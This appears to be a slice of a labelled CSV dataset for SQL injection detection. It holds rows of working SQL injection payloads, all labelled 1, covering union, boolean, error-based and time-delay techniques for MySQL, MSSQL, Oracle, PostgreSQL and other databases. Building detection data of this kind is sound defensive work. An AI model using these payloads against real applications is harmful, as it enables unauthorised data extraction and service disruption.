,payload,label
14494,"1' in boolean mode) union all select null,null,null,null,null,null#",1
14495,"1%"" or sleep(5)#",1
14496,1' union all select null--,1
14497,"1%"") and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (""%""=""",1
14498,1';waitfor delay '0:0:5'--,1
14499,-9331' or (4519=2912)*2912 and 'rddk'='rddk,1
14500,"1') as hlbq where 2347=2347 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
14501,"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",1
14502,"-9531'))) union all select 4076,4076#",1
14503,"-6815) where 2498=2498 union all select 2498,2498,2498,2498,2498--",1
14504,"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'bwrb' like 'bwrb",1
14505,1) waitfor delay '0:0:5'--,1
14506,"1%"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",1
14507,"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",1
14508,1));(select * from (select(sleep(5)))acdk)#,1
14509,1%')));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
14510,"1) where 7684=7684 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14511,"1"") as boeh where 2571=2571 union all select null#",1
14512,"-8844""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
14513,"1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='",1
14514,"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rhli",1
14515,"1%"") and 9764=6037 and (""%""=""",1
14516,"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1
14517,"1' or 8466=benchmark(5000000,md5(0x694a4745))",1
14518,"1""))) and (3020=3020)*6703 and (((""fqap"" like ""fqap",1
14519,"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('ibrj'='ibrj",1
14520,"-3359 union all select 4675,4675,4675--",1
14521,"1) as qyic where 9736=9736 and elt(3114=3114,sleep(5))#",1
14522,"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",1
14523,"-4980"" or (8459=8459)*4906 and ""mnlj"" like ""mnlj",1
14524,"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'ggcm' like 'ggcm",1
14525,"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
14526,"-2434'))) union all select 5509,5509,5509,5509,5509,5509,5509--",1
14527,"-9688%'))) or elt(3695=7995,7995) and ((('%'='",1
14528,"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1
14529,"1%"";select (case when (7005=7118) then 1 else 7005*(select 7005 from master..sysdatabases) end)--",1
14530,"-8245"")) or 3038=3038",1
14531,1));select pg_sleep(5) and ((4382=4382,1
14532,1'))) or sleep(5) and ((('bmnf' like 'bmnf,1
14533,1' where 9216=9216;select sleep(5)--,1
14534,"1%""))) and 8407=(select count(*) from generate_series(1,5000000)) and (((""%""=""",1
14535,"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
14536,1) as xwgf where 4204=4204 and sleep(5)--,1
14537,"1'||(select 'mjkz' where 9430=9430 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",1
14538,"1%"";begin user_lock.sleep(5); end--",1
14539,"1 where 7412=7412 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
14540,1'))) rlike (select (case when (5855=7142) then 1 else 0x28 end)) and ((('fkhd'='fkhd,1
14541,"-2013"")) as kisy where 3802=3802 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",1
14542,"-3370' in boolean mode) union all select 3432,3432,3432,3432#",1
14543,"-5161%"" or (1437=4869)*4869 and ""%""=""",1
14544,"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'qyyg'='qyyg",1
14545,"-3282') union all select 9002,9002,9002,9002,9002#",1
14546,"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",1
14547,"-2898"" where 3301=3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1
14548,"1'+(select ohqr where 5610=5610;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",1
14549,1%');(select * from (select(sleep(5)))srmq) and ('%'=',1
14550,"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('iqvg'='iqvg",1
14551,"1 where 5627=5627 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
14552,"1)) union all select null,null,null,null#",1
14553,"1%' or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
14554,"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('wgbh'='wgbh",1
14555,"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",1
14556,1) and 2006=2006,1
14557,"1'+(select 'rguk' where 6019=6019 union all select null,null,null,null,null--",1
14558,"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
14559,"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",1
14560,"1"") where 5850=5850 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",1
14561,"-4025"" or 3038=3038",1
14562,"1) as lhie where 4631=4631 union all select null,null,null,null,null--",1
14563,"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""jebr"" like ""jebr",1
14564,"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1
14565,"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",1
14566,"1"") as jngl where 8384=8384 and 4580=1718--",1
14567,"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'tqvy' like 'tqvy",1
14568,"1"" where 7158=7158;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
14569,1%' waitfor delay '0:0:5' and '%'=',1
14570,"1%' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14571,(select (case when (4108=4108) then 1 else 4108*(select 4108 from information_schema.character_sets) end)),1
14572,"1"") as lexx where 2892=2892 or elt(6272=6272,sleep(5))--",1
14573,"-2414%"") or elt(1032=1032,3623) and (""%""=""",1
14574,"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'vunt'='vunt",1
14575,"1)) as bwrg where 3254=3254 union all select null,null,null,null,null,null--",1
14576,"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""lsvg"" like ""lsvg",1
14577,1'));select (case when (9667=6212) then 9667 else cast(1 as int)/(select 0 from dual) end) from dual--,1
14578,"-4236) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",1
14579,1'))) or 4240=(select 4240 from pg_sleep(5))--,1
14580,1%';waitfor delay '0:0:5'--,1
14581,"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('ochr' like 'ochr",1
14582,1'+(select 'ezpy' where 5282=5282 order by 1#,1
14583,"1"") where 1793=1793;select (case when (5390=7419) then 5390 else 5390*(select 5390 from mysql.db) end)#",1
14584,"1"") where 9656=9656 and sleep(5)--",1
14585,"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",1
14586,"1%"";(select * from (select(sleep(5)))acdk)#",1
14587,"1))) or 8421=(select count(*) from generate_series(1,5000000)) and (((5340=5340",1
14588,"-5731"" union all select 3083,3083,3083#",1
14589,1)));select sleep(5) and (((8354=8354,1
14590,-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt,1
14591,"1) as azdb where 4219=4219 union all select null,null,null,null#",1
14592,"-8684 union all select 9519,9519,9519,9519--",1
14593,"1""))) and elt(1750=7826,7826) and (((""qcro""=""qcro",1
14594,"1' where 4102=4102 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
14595,"1"");iif(5257=5257,1,1/0)",1
14596,"1%"" union all select null,null,null--",1
14597,"1)));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
14598,"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('skdy'='skdy",1
14599,"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'idxa'='idxa",1
14600,"-8614') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
14601,"-1588%""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
14602,"-7601""))) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1
14603,1) where 9446=9446 union all select null#,1
14604,"1) as afxc where 7497=7497;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
14605,"1) as otsb where 8380=8380 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
14606,"1"")) and 7533=7533 and ((""gkca""=""gkca",1
14607,"-8734%"") or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""%""=""",1
14608,"1%"");select count(*) from generate_series(1,5000000)--",1
14609,"1"" where 5406=5406 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
14610,"-3391' union all select 2024,2024--",1
14611,"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
14612,"-4168') union all select 2618,2618#",1
14613,"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
14614,"-2131"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""wpsf"" like ""wpsf",1
14615,"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
14616,"-9924)) as zgqa where 2867=2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
14617,1'+(select 'wsjk' where 3291=3291;select (case when (9816=1693) then 9816 else cast(1 as int)/(select 0 from dual) end) from dual--,1
14618,"-8609' union all select 9384,9384,9384,9384--",1
14619,1') order by 1#,1
14620,"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh",1
14621,"1""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""wile"" like ""wile",1
14622,"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""gcnq"" like ""gcnq",1
14623,"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
14624,1%');select case when 7717=7717 then 1 else null end--,1
14625,"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq",1
14626,"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
14627,"1%'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",1
14628,1)) as xmac where 7692=7692;begin dbms_lock.sleep(5); end--,1
14629,1) where 8041=8041;select (case when (5970=2200) then 1 else 5970*(select 5970 from master..sysdatabases) end)--,1
14630,"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('peyy'='peyy",1
14631,1') as wvvo where 4288=4288;select (case when (5009=1133) then 5009 else 5009*(select 5009 from information_schema.character_sets) end)#,1
14632,"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu",1
14633,"1') as myxr where 6299=6299 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14634,"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# msrb",1
14635,"-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--",1
14636,1%' and 7366=9197#,1
14637,"1%'))) union all select null,null,null--",1
14638,"1')) as kfnt where 8090=8090 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1
14639,"1"")) as mlid where 1047=1047 union all select null,null#",1
14640,"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",1
14641,1') as ibaw where 2130=2130 and 9198=9198--,1
14642,1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,1
14643,"1"" or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14644,"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
14645,"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",1
14646,"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""suxh""=""suxh",1
14647,"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",1
14648,"1%"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1
14649,"-7678))) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1
14650,"1,(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
14651,-1890'))) or 8526=1389 and ((('ecgt'='ecgt,1
14652,"1"")) as gawq where 4728=4728 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
14653,"1%"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",1
14654,"1"") where 6821=6821 waitfor delay '0:0:5'--",1
14655,"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1
14656,"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",1
14657,"1') and make_set(9961=6559,6559) and ('exde'='exde",1
14658,"1')) as uizu where 1774=1774;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
14659,"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",1
14660,"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",1
14661,"1) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
14662,"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",1
14663,1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',1
14664,"1%""))) and (select * from (select(sleep(5)))fzno) and (((""%""=""",1
14665,1) where 1013=1013 and 5573=9445#,1
14666,"-5969"" where 9248=9248 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
